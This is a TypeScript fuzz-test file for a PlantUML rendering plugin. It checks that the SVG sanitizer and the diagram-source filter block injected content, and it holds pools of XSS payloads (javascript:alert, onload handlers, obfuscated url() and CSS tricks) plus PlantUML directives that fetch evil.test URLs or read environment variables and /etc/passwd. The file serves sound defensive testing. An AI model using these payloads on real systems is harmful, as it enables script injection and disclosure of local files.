import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { inflateRawSync } from "node:zlib";

import fc from "fast-check";
import { h } from "hastscript";
import { VFile } from "vfile";
import { describe, expect, it, vi } from "vitest";

import plantuml from "../../../plugins/rehype-plantuml.ts";
import { safeFetch } from "../../../plugins/safe-fetch.ts";
import { assertProperty, runs } from "./gen.ts";

import type { Element, Root } from "hast";

vi.mock("../../../plugins/safe-fetch.ts", () => ({ safeFetch: vi.fn() }));
vi.spyOn(console, "warn").mockImplementation(() => undefined);

const file = new VFile({ path: "/contents/writer/post.md" });
const cacheDir = mkdtempSync(join(tmpdir(), "fuzz-puml-"));
const transform = plantuml({ contents: "/contents", cacheDir });
let counter = 0;
const code = (source: string) => h("pre.language-plantuml", [h("code", source)]);

const allowedTags = new Set([
  "svg",
  "g",
  "path",
  "rect",
  "circle",
  "ellipse",
  "line",
  "polyline",
  "polygon",
  "text",
  "tspan",
  "defs",
  "marker",
  "clipPath",
  "linearGradient",
  "radialGradient",
  "stop",
  "title",
  "desc",
]);
const allowedProps = new Set([
  "viewBox",
  "width",
  "height",
  "x",
  "y",
  "x1",
  "x2",
  "y1",
  "y2",
  "cx",
  "cy",
  "r",
  "rx",
  "ry",
  "d",
  "points",
  "transform",
  "fill",
  "fill-opacity",
  "stroke",
  "stroke-width",
  "stroke-opacity",
  "stroke-dasharray",
  "stroke-linecap",
  "stroke-linejoin",
  "opacity",
  "font-family",
  "font-size",
  "font-weight",
  "font-style",
  "text-anchor",
  "dominant-baseline",
  "id",
  "offset",
  "stop-color",
  "stop-opacity",
  "markerWidth",
  "markerHeight",
  "refX",
  "refY",
  "orient",
  "markerUnits",
  "clip-path",
  "marker-start",
  "marker-mid",
  "marker-end",
]);

const svgViolations = (tree: Root) => {
  const out: string[] = [];
  const walk = (node: Root | Element) => {
    for (const child of node.children) {
      if (child.type !== "element") {
        if (child.type !== "text") out.push(`node type ${child.type}`);
        continue;
      }
      if (!allowedTags.has(child.tagName)) out.push(`tag <${child.tagName}>`);
      for (const [k, v] of Object.entries(child.properties)) {
        if (!allowedProps.has(k)) out.push(`prop ${k}`);
        const val = Array.isArray(v) ? v.join(" ") : String(v);
        if (/url\s*\(/i.test(val) && !/^url\(#mermaid-plantuml-\d+-[\w.:-]+\)$/.test(val))
          out.push(`url() in ${k}=${val}`);
        if (
          k !== "id" &&
          !/^url\(#mermaid-plantuml-\d+-[\w.:-]+\)$/.test(val) &&
          /javascript\s*:|vbscript\s*:|data:|expression\s*\(|@import|<|>|\\|\/\*/i.test(val)
        )
          out.push(`suspicious ${k}=${val}`);
        if (k === "id" && !/^mermaid-plantuml-\d+(?:-[a-z_][\w.:-]*)?$/i.test(val)) out.push(`bad id ${val}`);
        if (/^on/i.test(k)) out.push(`event ${k}`);
      }
      walk(child);
    }
  };
  walk(tree);
  return out;
};

const run = async (source: string, svg: string) => {
  vi.mocked(safeFetch).mockResolvedValue(Buffer.from(svg));
  const tree: Root = { type: "root", children: [code(source)] };
  await transform(tree, file);
  return tree;
};

// SVG の生成
const tagPool = [
  "svg",
  "g",
  "path",
  "rect",
  "circle",
  "ellipse",
  "line",
  "polyline",
  "polygon",
  "text",
  "tspan",
  "defs",
  "marker",
  "clipPath",
  "linearGradient",
  "radialGradient",
  "stop",
  "title",
  "desc",
  "script",
  "foreignObject",
  "style",
  "a",
  "use",
  "image",
  "animate",
  "set",
  "animateTransform",
  "svg:script",
  "svg:g",
  "SVG",
  "Path",
  "clippath",
  "html:script",
  "xhtml:iframe",
  "iframe",
  "img",
  "image",
  "feImage",
  "filter",
  "mask",
  "pattern",
  "symbol",
  "switch",
  "view",
  "cursor",
  "font-face",
  "metadata",
  "textPath",
  "tref",
  "handler",
  "listener",
  "unknown",
];
const attrPool = [
  "viewBox",
  "width",
  "height",
  "x",
  "y",
  "d",
  "points",
  "transform",
  "fill",
  "stroke",
  "stroke-width",
  "opacity",
  "font-family",
  "id",
  "offset",
  "stop-color",
  "clip-path",
  "marker-start",
  "marker-end",
  "marker-mid",
  "style",
  "onload",
  "onclick",
  "onerror",
  "onmouseover",
  "href",
  "xlink:href",
  "xmlns:xlink",
  "xmlns",
  "src",
  "data",
  "class",
  "filter",
  "mask",
  "xml:base",
  "xlink:show",
  "xlink:actuate",
  "begin",
  "end",
  "values",
  "attributeName",
  "from",
  "to",
  "by",
  "mask",
  "cursor",
  "font-size",
  "text-anchor",
  "orient",
  "markerWidth",
  "refX",
  "ID",
  "Id",
  "STYLE",
  "FILL",
  "__proto__",
  "constructor",
  "toString",
  "srcdoc",
  "formaction",
  "action",
  "target",
  "type",
  "version",
  "baseProfile",
  "content",
  "name",
];
const valuePool = [
  "red",
  "#fff",
  "none",
  "0 0 100 50",
  "10",
  "10px",
  "50%",
  "url(#a)",
  "url(#a) url(#b)",
  "url( #a )",
  "url('#a')",
  'url("#a")',
  "url(#a)fallback",
  "URL(#a)",
  "uRl(#a)",
  "url(https://evil.test/x)",
  "url(data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)",
  "url(javascript:alert(1))",
  "url(//evil.test)",
  "u\\72l(#a)",
  "ur\\6c(#a)",
  "\\75rl(#a)",
  "ur/**/l(#a)",
  "javascript:alert(1)",
  "JaVaScRiPt:alert(1)",
  "java\nscript:alert(1)",
  "java&#x09;script:alert(1)",
  "data:text/html,<script>alert(1)</script>",
  "alert(1)",
  "expression(alert(1))",
  "expr/**/ession(alert(1))",
  "@import 'x'",
  "@import url(x)",
  "fill:red",
  "fill:url(#a)",
  "fill:url(https://evil.test)",
  "fill:red;stroke:url(https://evil.test)",
  "fill:red; stroke : blue ;opacity:.5",
  "fill: red;;;",
  "fill",
  ":",
  ";",
  "position:fixed;top:0",
  "fill:red;background:url(x)",
  "stroke:url(#a);fill:url(#b)",
  "fill:url(#a)!important",
  "fill:url(#a),red",
  "clip-path:url(#a)",
  "marker-end:url(#m)",
  "marker-end: url(#m) ",
  "font-family:'a';src:url(x)",
  "font-family:url(x)",
  'x"y',
  "x'y",
  "<script>",
  "</svg><script>alert(1)</script>",
  "]]>",
  "<![CDATA[",
  "a b",
  "",
  "#a",
  "#a.b:c",
  "a.b:c",
  "1a",
  "a-b",
  "a b",
  "../x",
  "x/y",
  "-_",
  "\u202e",
  "a\u200bb",
  "&#x202e;",
  "&#8238;",
  "&amp;",
  "&lt;script&gt;",
  "&#x75;rl(#a)",
  "&#117;rl(https://evil.test)",
  "&#x6A;avascript:alert(1)",
  "url&#x28;https://evil.test&#x29;",
  "url&lpar;https://evil.test&rpar;",
  "\u0000",
  "\ud800",
  "𝐮𝐫𝐥(#a)",
  "ｕｒｌ(#a)",
  "url\u200b(#a)",
  "u\u00adrl(https://evil.test)",
];
const textPool = [
  "hello",
  "<script>alert(1)</script>",
  "&lt;script&gt;",
  "&amp;lt;",
  "]]>",
  "\u202e",
  "a\u200bb",
  "http://evil.test",
  "&#x202e;",
  "&#x1F3F4;&#xE0067;",
  "\ud800",
  "x\u0000y",
  "javascript:alert(1)",
  "%",
  "{{x}}",
  "${x}",
];

const esc = (value: string) => {
  // 属性値を、ランダムに文字参照へ変換する
  return value;
};
const attrArb = fc
  .tuple(fc.constantFrom(...attrPool), fc.constantFrom(...valuePool), fc.constantFrom('"', "'"), fc.boolean())
  .map(([k, v, q, ent]) => {
    let val = v;
    if (ent)
      val = Array.from(val)
        .map((c, i) => (i % 3 === 0 && /[a-z(:]/i.test(c) ? `&#x${c.codePointAt(0)!.toString(16)};` : c))
        .join("");
    val = q === '"' ? val.replace(/"/g, "&quot;") : val.replace(/'/g, "&apos;");
    return `${k}=${q}${esc(val)}${q}`;
  });
const { svgTree } = fc.letrec((tie) => ({
  svgTree: fc.oneof(
    { depthSize: "small" },
    { weight: 2, arbitrary: fc.constantFrom(...textPool) },
    {
      weight: 1,
      arbitrary: fc.constantFrom(
        "<!-- c -->",
        "<![CDATA[<script>alert(1)</script>]]>",
        '<?xml version="1.0"?>',
        "<?pi x?>",
        '<!DOCTYPE svg [<!ENTITY x "y">]>',
        "&x;",
        "<![CDATA[",
        "]]>",
        "<!--",
        "-->"
      ),
    },
    {
      weight: 6,
      arbitrary: fc
        .tuple(
          fc.constantFrom(...tagPool),
          fc.array(attrArb, { maxLength: 5 }),
          fc.array(tie("svgTree"), { maxLength: 4 }),
          fc.boolean()
        )
        .map(([tag, attrs, children, selfClose]) =>
          selfClose && !children.length
            ? `<${tag} ${attrs.join(" ")}/>`
            : `<${tag} ${attrs.join(" ")}>${children.join("")}</${tag}>`
        ),
    }
  ),
}));
const svgDoc = fc
  .tuple(
    fc.array(attrArb, { maxLength: 4 }),
    fc.array(svgTree, { maxLength: 6 }),
    fc.constantFrom(
      "",
      '<?xml version="1.0" encoding="UTF-8"?>',
      '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">',
      "<foo/>",
      "<html><svg onload=1></svg></html>"
    ),
    fc.constantFrom("svg", "svg:svg", "SVG", "svg"),
    fc.constantFrom(
      "",
      ' xmlns="http://www.w3.org/2000/svg"',
      ' xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svg="http://www.w3.org/2000/svg"'
    )
  )
  .map(([a, c, pre, root, ns]) => `${pre}<${root}${ns} ${a.join(" ")}>${c.join("")}</${root}>`);

describe("PlantUML SVG sanitizer fuzz", () => {
  it("only allowlisted tags/attributes survive; no url()/javascript:", async () => {
    let converted = 0;
    const n = await assertProperty(
      fc.asyncProperty(svgDoc, async (svg) => {
        const tree = await run(`@startuml\nA -> B: ${String(counter++)}\n@enduml`, svg);
        const first = tree.children[0] as Element;
        if (first.tagName === "pre") return;
        converted++;
        const v = svgViolations(tree);
        if (v.length) throw new Error(`${JSON.stringify(v.slice(0, 5))} svg=${svg.slice(0, 600)}`);
      }),
      runs(30000)
    );
    console.log("SVG_RUNS", n, "converted", converted);
  }, 1_200_000);
  it("raw text SVG mutations (byte-level)", async () => {
    const seeds = [
      '<svg viewBox="0 0 10 10"><g id="a" fill="url(#b)"><path d="M0 0" style="stroke:url(#a);fill:red"/><text>x<tspan>y</tspan></text></g><defs><clipPath id="b"/></defs></svg>',
    ];
    await assertProperty(
      fc.asyncProperty(
        fc.constantFrom(...seeds),
        fc.array(
          fc.tuple(
            fc.nat(300),
            fc.constantFrom(
              "<",
              ">",
              '"',
              "'",
              "&",
              "&#",
              ";",
              "/",
              "!",
              "[",
              "]",
              "-",
              "url(",
              "javascript:",
              "\u0000",
              "\ud800",
              "xlink:href=",
              " onload=",
              "<script>",
              "<![CDATA[",
              "]]>",
              "<!--",
              "-->",
              "\u202e",
              "%"
            )
          ),
          { minLength: 1, maxLength: 6 }
        ),
        async (seed, edits) => {
          let svg = seed;
          for (const [p, ins] of edits) {
            const i = p % (svg.length + 1);
            svg = svg.slice(0, i) + ins + svg.slice(i);
          }
          const tree = await run(`@startuml\nA -> B: ${String(counter++)}\n@enduml`, svg);
          if ((tree.children[0] as Element).tagName === "pre") return;
          const v = svgViolations(tree);
          if (v.length) throw new Error(`${JSON.stringify(v.slice(0, 5))} svg=${svg}`);
        }
      ),
      runs(30000)
    );
  }, 1_200_000);
});

// PlantUML の URL エンコード（deflate-raw と独自の base64）を元に戻す
const alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_";
const decode = (encoded: string) => {
  const bytes: number[] = [];
  for (let i = 0; i < encoded.length; i += 4) {
    const [a, b, c, d] = [0, 1, 2, 3].map((k) => alphabet.indexOf(encoded[i + k] ?? "0"));
    bytes.push((a! << 2) | (b! >> 4), ((b! & 15) << 4) | (c! >> 2), ((c! & 3) << 6) | d!);
  }
  return inflateRawSync(Buffer.from(bytes)).toString("utf8");
};

// 通過した図のソースに、PlantUML が解釈しうるプリプロセッサ、組み込み関数、外部参照が残っていないか
// PlantUML の行頭の空白は、Java の trim()（U+0020 以下をすべて取り除く）として扱われる、と仮定する（未確認）
const lines = (s: string) => s.split(/[\r\n\u2028\u2029]/);
const oddLines = (s: string) => s.split(/[\u0085\u000b\u000c]/);
// 行頭の C0 制御文字（JS の \s に含まれない U+0000-0008、U+000E-001F）を PlantUML が空白として扱うかは未確認
const dangerous = (source: string): string | undefined => {
  for (const line of lines(source)) {
    const t = line.replace(/^[\u0000-\u0020]+/, "");
    if (/^[\u0000-\u0008\u000e-\u001f]/.test(line) && t.startsWith("!"))
      return "directive after C0 control (unverified: depends on PlantUML trim)";
    if (/^[\u0000-\u0008\u000e-\u001f]/.test(line) && /^\$\w/.test(t))
      return "variable assignment after C0 control (unverified)";
    if (/^\s*!/.test(line) || /^\s*\$\w/.test(line)) return "PLAIN directive/variable (filter should have blocked)";
  }
  for (const piece of oddLines(source).slice(1)) {
    if (/^[ \t]*!/.test(piece) || /^[ \t]*\$\w/.test(piece))
      return "directive after VT/FF/NEL line break (unverified: JS m-flag ^ ignores them, Java \\R does not)";
  }
  if (/%\w+\s*\(/.test(source)) return "PLAIN builtin call";
  if (source.includes("[[")) return "PLAIN link";
  if (/(?:https?|file):/i.test(source)) return "PLAIN scheme";
  if (/<\s+img/i.test(source)) return "img with whitespace after < (unverified: depends on PlantUML creole parser)";
  if (/<img\b/i.test(source)) return "PLAIN img";
  return undefined;
};

const pumlLines = [
  "A -> B: hello",
  "Alice -> Bob: Hi",
  "class A",
  "note left: x",
  "title t",
  "'comment",
  "/' block '/",
  "/'",
  "'/",
  "skinparam monochrome true",
  "participant X",
  "!include http://evil.test/x",
  "!includeurl http://evil.test/x",
  "!include https://evil.test/x.puml",
  "!include <C4/C4_Container>",
  "!include_many x",
  "!includesub x",
  "!import x.zip",
  "!theme plain from http://evil.test",
  "!theme x",
  "!pragma teoz true",
  "!define X 1",
  "!definelong X\nfoo\n!enddefinelong",
  "!procedure $p()\n!endprocedure",
  "!function $f()\n!return 1\n!endfunction",
  "!$a = 1",
  '!$a = %getenv("HOME")',
  "$a = 1",
  "$a ?= 1",
  "$a=1",
  "$100",
  "cost $100",
  "A -> B: $a",
  "A -> B: %d",
  "A -> B: 50%",
  'A -> B: %load_json("x")',
  'A -> B: %getenv("x")',
  "A -> B: %filename()",
  "%date()",
  "%string(1)",
  '%call_user_func("$f")',
  '%invoke_procedure("$p")',
  '%load_json\n("x")',
  '%get_json_attribute(%load_json("x"), "y")',
  "%true()",
  "%version ()",
  "%size (x)",
  '%upper("x")',
  '%getenv\t("x")',
  "%getenv/'c'/(\"x\")",
  '%getenv\u00a0("x")',
  '%getenv\u200b("x")',
  '%getenv\u0001("x")',
  '%getenv\\\n("x")',
  "[[http://evil.test]]",
  "[[ http://evil.test{tip} label]]",
  "url of A is [[http://evil.test]]",
  "A -> B: [[x]]",
  "[[",
  "]]",
  "A -> B: <img:http://evil.test/x.png>",
  "<img:file:///etc/passwd>",
  "< img:http://x>",
  "<IMG:x>",
  "<img\n:x>",
  "<img",
  "<$sprite>",
  'sprite $s <svg viewBox="0 0 1 1"></svg>',
  "sprite $s jar:archive/name",
  "sprite $s [16x16/16] {\nFF\n}",
  "http://evil.test",
  "https://evil.test",
  "HTTP://EVIL.TEST",
  "file:///etc/passwd",
  "FILE:x",
  "ht\ntp://evil.test",
  "http\n://evil.test",
  "ht\u200btp://evil.test",
  "h\u00adttp://evil.test",
  "http\u200b://evil.test",
  "https :// evil.test",
  "\\u0068ttp://evil",
  "ｈｔｔｐ://evil.test",
  "http&#58;//evil.test",
  "http%3A//evil.test",
  "data:text/html,x",
  "jar:file:x",
  "ftp://x",
  "mailto:a@b",
  "//evil.test",
  "\x01!include http://evil.test",
  "\x0b!include http://evil.test",
  "\x00!include x",
  "\u200b!include x",
  "\u00a0!include x",
  "\ufeff!include x",
  "  !include x",
  "\t!include x",
  "\u3000!include x",
  "！include x",
  "\x01$a = 1",
  "\u200b$a=1",
  "\u00a0$a=1",
  " $a=1",
  "!\u200binclude x",
  "\\\n!include x",
  "A -> B: \\\n!include x",
  "A -> B ; !include x",
  "A -> B: x\n!include x",
  "{\n!include x\n}",
  "legend\n!include x\nend legend",
  "note over A\n!include x\nend note",
  "@startuml",
  "@enduml",
  "@startjson",
  "@endjson",
  "@startuml\nA->B\n@enduml\n@startuml",
  "@startuml\nfoo\n@enduml",
  "@enduml\n@startuml",
  "@startsalt",
  "@startwbs",
  "@startyaml",
  "@startmindmap",
  "@startdot",
  "@startditaa",
  '{\n"a": 1\n}',
  "a: 1",
  "* root\n** child",
  "{{\nsalt\n}}",
  "<code>\n!include x\n</code>",
  "```\n!include x\n```",
  '"',
  "\\",
  "\\n",
  "\r",
  "\r\n",
  "\n",
  "\u2028",
  "\u0085",
  "\x0b",
  "\x0c",
];
const pumlSource = fc
  .tuple(
    fc.constantFrom(
      "@startuml",
      "@startuml ",
      "\n@startuml",
      "  @startuml",
      "\ufeff@startuml",
      "@startjson",
      "@startyaml",
      "@startsalt",
      "@startwbs",
      "@STARTUML",
      "@startuml\r"
    ),
    fc.array(
      fc.tuple(fc.constantFrom(...pumlLines), fc.constantFrom("\n", "\n", "\r\n", "\r", "\u2028", "\x0b", " ", "")),
      { maxLength: 10 }
    ),
    fc.constantFrom("@enduml", "@enduml\n", "@enduml  ", "@endjson", "@endyaml", "@endsalt", "@endwbs")
  )
  .map(([start, mids, end]) => {
    const type = /@start([a-z]+)/i.exec(start)?.[1]?.toLowerCase() ?? "uml";
    const finish = end.replace(/@end[a-z]+/i, `@end${type}`);
    return (n: number) => `${start}\n${mids.map(([l, s]) => l + s).join("")}\n' ${String(n)}\n${finish}`;
  });

describe("PlantUML source filter fuzz", () => {
  it("sources that reach the network do not contain directives, builtins, links or URLs", async () => {
    const bypasses = new Map<string, string>();
    let reached = 0;
    await assertProperty(
      fc.asyncProperty(pumlSource, async (source) => {
        vi.mocked(safeFetch).mockClear();
        vi.mocked(safeFetch).mockResolvedValue(Buffer.from("<svg/>"));
        const unique = source(counter++);
        const tree: Root = { type: "root", children: [code(unique)] };
        await transform(tree, file);
        const calls = vi.mocked(safeFetch).mock.calls;
        if (!calls.length) return;
        reached++;
        const sent = decode(calls[0]![0].split("/svg/")[1]!);
        const why = dangerous(sent);
        if (why && !bypasses.has(why.split(":")[0]!)) bypasses.set(why.split(":")[0]!, unique);
      }),
      runs(60000)
    );
    console.log("PUML_REACHED", reached, "BYPASSES", JSON.stringify([...bypasses]));
    // フィルターが拒否するはずの構文の送信は失敗にする（PlantUML の解釈が未確認のものは、調査の記録として出力だけする）
    expect([...bypasses].filter(([why]) => why.startsWith("PLAIN"))).toEqual([]);
  }, 1_200_000);
});

describe("PlantUML robustness", () => {
  it("deep nesting and large SVG do not crash the build or take long", async () => {
    const thrown: string[] = [];
    for (const [name, svg] of [
      ["deep g 20000", `<svg>${"<g>".repeat(20000)}${"</g>".repeat(20000)}</svg>`],
      ["deep g 200000", `<svg>${"<g>".repeat(200000)}</svg>`],
      ["wide 100000", `<svg>${"<rect/>".repeat(100000)}</svg>`],
      ["many attrs", `<svg ${Array.from({ length: 20000 }, (_, i) => `a${String(i)}="x"`).join(" ")}/>`],
      ["long text", `<svg><text>${"a".repeat(900000)}</text></svg>`],
    ] as const) {
      const t = performance.now();
      let outcome = "converted";
      // 図を拒否してコードのまま残すのは正常な動き、例外が外へ出るのは失敗
      try {
        const tree = await run(`@startuml\nA -> B: ${String(counter++)}\n@enduml`, svg);
        if ((tree.children[0] as Element).tagName === "pre") outcome = "left as code (rejected)";
      } catch (e) {
        outcome = `THROWN ${String(e).slice(0, 80)}`;
        thrown.push(`${name}: ${outcome}`);
      }
      console.log("PUML_ROBUST", name, outcome, Math.round(performance.now() - t), "ms");
    }
    expect(thrown).toEqual([]);
  }, 600_000);
});
